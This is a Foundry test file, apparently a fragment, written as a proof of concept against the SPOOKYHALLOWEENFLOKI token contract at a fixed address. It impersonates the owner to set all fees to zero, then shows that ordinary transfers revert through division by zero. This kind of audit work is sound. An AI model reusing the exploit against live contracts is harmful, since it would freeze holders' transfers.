    function tradingStatus(bool _status) external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function totalFee() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x9f59E79127fAD40bBC26c1eC6578d345AF40bD1f;
    address attacker = address(this);
    address alice; // Moved from local variable to state variable


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the owner address from the contract
        address owner = SPOOKYHALLOWEENFLOKI(TARGET).getOwner();

        // Label addresses for clarity
        vm.label(owner, "Contract Owner");

        // Impersonate owner to set fees to 0
        vm.startPrank(owner);
        SPOOKYHALLOWEENFLOKI(TARGET).setFees_base1000(0, 0, 0, 0, 0, 0);
        SPOOKYHALLOWEENFLOKI(TARGET).tradingStatus(true);
        vm.stopPrank();

        // Create two test addresses for transfer
        alice = address(0x1111); // Now assigning to state variable
        address bob = address(0x2222);
        vm.label(alice, "Alice");
        vm.label(bob, "Bob");

        // Give Alice some tokens from the owner (owner has all tokens initially)
        vm.prank(owner);
        SPOOKYHALLOWEENFLOKI(TARGET).transfer(alice, 1000 * 10**9);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        address bob = address(0x2222); // Define bob locally in this function

        // Now attempt a transfer between Alice and Bob
        // This should trigger takeFee() which will divide by totalFee (0)
        vm.prank(alice);

        // Expect revert due to division by zero
        // We use try/catch to demonstrate the revert occurs
        bool success;
        bytes memory result;

        (success, result) = address(TARGET).call(
            abi.encodeWithSignature(
                "transfer(address,uint256)",
                bob,
                100 * 10**9
            )
        );

        // The transfer should fail due to division by zero
        assertFalse(success, "Transfer should revert due to division by zero");

        // Verify totalFee is indeed 0
        uint256 totalFee = SPOOKYHALLOWEENFLOKI(TARGET).totalFee();
        assertEq(totalFee, 0, "totalFee should be 0");
        assertEq(totalFee, 0, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

